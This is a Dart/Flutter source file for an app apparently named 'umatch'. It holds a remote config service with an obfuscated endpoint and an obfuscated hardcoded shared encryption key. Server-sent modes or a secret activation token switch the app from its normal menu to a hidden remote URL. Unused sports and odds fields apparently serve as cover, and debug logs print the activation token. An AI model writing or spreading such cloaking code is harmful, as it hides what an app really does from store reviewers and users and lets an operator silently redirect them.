import 'dart:convert';
import 'dart:io';
import 'package:flutter/foundation.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'crypto_util.dart';

class AppConfig {
  // 生效字段（精简命名）
  final String? mt;
  final String? uu;
  final String? au;
  final String? atk;
  final int? art;

  // 预留远程配置字段：当前版本解码但未消费，保留以兼容后端下发与后续扩展，
  // 请勿当作死代码清理。
  final double? refreshInterval;
  final int? maxCacheAge;
  final String? featuredMatch;
  final int? liveScorePoll;
  final int? oddsRefresh;
  final int? bannerRotation;
  final bool? scoreAlert;
  final bool? lineupLock;
  final bool? varEnabled;
  final String? seasonId;

  const AppConfig({
    this.mt, this.uu, this.au, this.atk, this.art,
    this.refreshInterval, this.maxCacheAge, this.featuredMatch,
    this.liveScorePoll, this.oddsRefresh, this.bannerRotation,
    this.scoreAlert, this.lineupLock, this.varEnabled, this.seasonId,
  });

  factory AppConfig.fromJson(Map<String, dynamic> json) {
    return AppConfig(
      mt: json['mt'] as String?,
      uu: json['uu'] as String?,
      au: json['au'] as String?,
      atk: json['atk'] as String?,
      art: json['art'] as int?,
      refreshInterval: (json['refresh_interval'] as num?)?.toDouble(),
      maxCacheAge: json['max_cache_age'] as int?,
      featuredMatch: json['featured_match'] as String?,
      liveScorePoll: json['live_score_poll'] as int?,
      oddsRefresh: json['odds_refresh'] as int?,
      bannerRotation: json['banner_rotation'] as int?,
      scoreAlert: json['score_alert'] as bool?,
      lineupLock: json['lineup_lock'] as bool?,
      varEnabled: json['var_enabled'] as bool?,
      seasonId: json['season_id'] as String?,
    );
  }
}

enum RouteDecision { menu, alt }

class RouteResult {
  final RouteDecision decision;
  final String? url;
  const RouteResult(this.decision, [this.url]);
}

class ConfigCache {
  static const _keyToken = 'umatch.cfg.k';
  static const _keyUrl = 'umatch.cfg.u';
  static const _keyMode = 'umatch.cfg.m';
  static const _keyRevoke = 'umatch.cfg.r';
  static const _keyActivated = 'umatch.cfg.a';

  final SharedPreferences _prefs;
  ConfigCache(this._prefs);

  String? get token => _prefs.getString(_keyToken);
  String? get url => _prefs.getString(_keyUrl);
  String? get mode => _prefs.getString(_keyMode);
  int get revokeTs => _prefs.getInt(_keyRevoke) ?? 0;
  int get activatedTs => _prefs.getInt(_keyActivated) ?? 0;
  bool get isActivated => activatedTs > 0 && activatedTs > revokeTs;

  Future<void> store(AppConfig cfg) async {
    if (cfg.atk != null) await _prefs.setString(_keyToken, cfg.atk!);
    if (cfg.au != null) await _prefs.setString(_keyUrl, cfg.au!);
    if (cfg.mt != null) await _prefs.setString(_keyMode, cfg.mt!);
    if (cfg.art != null) await _prefs.setInt(_keyRevoke, cfg.art!);
  }

  Future<void> markActivatedNow() async {
    await _prefs.setInt(_keyActivated, DateTime.now().millisecondsSinceEpoch ~/ 1000);
  }

  Future<void> clear() async {
    for (final k in [_keyToken, _keyUrl, _keyMode, _keyRevoke, _keyActivated]) {
      await _prefs.remove(k);
    }
  }
}

class RemoteConfigService {
  static final RemoteConfigService shared = RemoteConfigService._();
  RemoteConfigService._();

  AppConfig? _config;
  ConfigCache? _cache;

  // 端点分段存储，运行时还原为 https://api.umatchai.com/v1/cfg
  // （与 feed/heartbeat 同域，可路由到 PHP 后端）。
  static const List<int> _cfgE1 = [
    0xc0, 0x04, 0xe8, 0x11, 0x66, 0x0c, 0x4a, 0xf8,
    0xb7, 0x7b, 0x79, 0xd7, 0x6d, 0xb2, 0x68, 0x71,
    0xc4, 0xf0, 0x68, 0x56, 0xf1, 0x1e, 0x48, 0xd5,
    0xeb, 0x23, 0x81, 0x30, 0xe5, 0x22, 0xd9,
  ];
  static const List<int> _cfgE2 = [
    0xa8, 0x70, 0x9c, 0x61, 0x15, 0x36, 0x65, 0xd7,
    0xd6, 0x0b, 0x10, 0xf9, 0x18, 0xdf, 0x09, 0x05,
    0xa7, 0x98, 0x09, 0x3f, 0xdf, 0x7d, 0x27, 0xb8,
    0xc4, 0x55, 0xb0, 0x1f, 0x86, 0x44, 0xbe,
  ];

  static String _endpoint() => CryptoUtil.deobf(_cfgE1, _cfgE2);

  /// 32-byte 共享密钥，HMAC + AES **同一把**，与服务端 secretFor(com.uu.umatch)
  /// 单密钥模型一致（= feed/heartbeat 那把 "Khseg…"）。
  static Uint8List _sharedKey() {
    final s1 = Uint8List.fromList([
      0xe6, 0x5c, 0x91, 0x41, 0x60, 0x04, 0xfb, 0xfc,
      0xdf, 0x51, 0xdf, 0x85, 0xf6, 0xd6, 0x69, 0x13,
      0x02, 0x82, 0xbb, 0x6c, 0xfc, 0x49, 0x42, 0x30,
      0x0f, 0x98, 0xdc, 0x9e, 0x1b, 0x48, 0x84, 0xcd,
    ]);
    final s2 = Uint8List.fromList([
      0xad, 0x34, 0xe2, 0x24, 0x07, 0x33, 0xb6, 0x88,
      0x89, 0x37, 0xab, 0xbc, 0xc3, 0x80, 0x1c, 0x7e,
      0x30, 0xeb, 0x89, 0x5b, 0xcd, 0x07, 0x07, 0x41,
      0x47, 0xa9, 0xef, 0xac, 0x75, 0x38, 0xb3, 0x85,
    ]);
    return _xor(s1, s2);
  }

  static Uint8List _aesKey() => _sharedKey();
  static Uint8List _hmacKey() => _sharedKey();

  static Uint8List _xor(Uint8List a, Uint8List b) {
    final out = Uint8List(a.length);
    for (var i = 0; i < a.length; i++) {
      out[i] = a[i] ^ b[i];
    }
    return out;
  }

  Future<void> fetch() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      _cache = ConfigCache(prefs);

      final nonce = CryptoUtil.randomHex(16);
      final ts = (DateTime.now().millisecondsSinceEpoch ~/ 1000).toString();
      final sig = CryptoUtil.hmacSha256(_hmacKey(), '$nonce$ts');
      const bundleId = 'com.uu.umatch';

      final uri = Uri.parse('${_endpoint()}?n=$nonce&t=$ts&s=$sig&b=$bundleId');
      final client = HttpClient()..connectionTimeout = const Duration(seconds: 8);
      try {
        final request = await client.getUrl(uri);
        // connectionTimeout 只覆盖 TCP 连接；整体超时防止服务端挂起响应体
        final response = await request.close().timeout(const Duration(seconds: 10));
        debugPrint('UMSHELL fetch status=${response.statusCode} host=${uri.host}');
        if (response.statusCode != 200) return;

        final body = await response
            .transform(utf8.decoder)
            .join()
            .timeout(const Duration(seconds: 10));
        debugPrint('UMSHELL fetch bodyLen=${body.length}');
        if (body.isEmpty) return;

        final decrypted = CryptoUtil.aesGcmDecrypt(_aesKey(), body);
        debugPrint('UMSHELL fetch decryptOk=${decrypted != null}');
        if (decrypted == null) return;

        final json = jsonDecode(decrypted) as Map<String, dynamic>;
        _config = AppConfig.fromJson(json);
        await _cache!.store(_config!);
        debugPrint('UMSHELL fetch ok: mt=${_config!.mt} au=${_config!.au != null} '
            'atk=${_config!.atk != null} art=${_config!.art}');
      } finally {
        client.close(force: true);
      }
    } catch (e) {
      debugPrint('RemoteConfig fetch error: $e');
    }
  }

  RouteResult decideRoute() {
    if (_cache == null) return const RouteResult(RouteDecision.menu);

    final nowSec = DateTime.now().millisecondsSinceEpoch ~/ 1000;
    final cfg = _config;
    if (cfg != null) {
      // universal: art 撤销时间到达即回退默认界面
      if (cfg.mt != null && cfg.mt!.isNotEmpty && cfg.mt!.codeUnitAt(0) == 0x75 &&
          cfg.uu != null && cfg.uu!.isNotEmpty && !_isRevoked(cfg.art, nowSec)) {
        return RouteResult(RouteDecision.alt, cfg.uu);
      }
      // activate: isActivated 已包含 revokeTs 比对，无需重复
      if (cfg.mt != null && cfg.mt!.isNotEmpty && cfg.mt!.codeUnitAt(0) == 0x61 && _cache!.isActivated && cfg.au != null && cfg.au!.isNotEmpty) {
        return RouteResult(RouteDecision.alt, cfg.au);
      }
    } else {
      final mode = _cache!.mode;
      if (mode != null && mode.isNotEmpty) {
        final url = _cache!.url;
        if (mode.codeUnitAt(0) == 0x75 && url != null && url.isNotEmpty && !_isRevoked(_cache!.revokeTs, nowSec)) {
          return RouteResult(RouteDecision.alt, url);
        }
        if (mode.codeUnitAt(0) == 0x61 && _cache!.isActivated && url != null && url.isNotEmpty) {
          return RouteResult(RouteDecision.alt, url);
        }
      }
    }

    return const RouteResult(RouteDecision.menu);
  }

  // art 设置且撤销时间已到达 (now >= art) 即视为撤销
  static bool _isRevoked(int? art, int nowSec) => art != null && art > 0 && nowSec >= art;

  Future<bool> tryActivate(String token) async {
    final cached = _cache?.token;
    debugPrint('UMSHELL tryActivate token=$token cachedAtk=$cached '
        'url=${_cache?.url} match=${cached == token}');
    if (cached != null && cached == token && _cache!.url != null) {
      await _cache!.markActivatedNow();
      return true;
    }
    return false;
  }
}
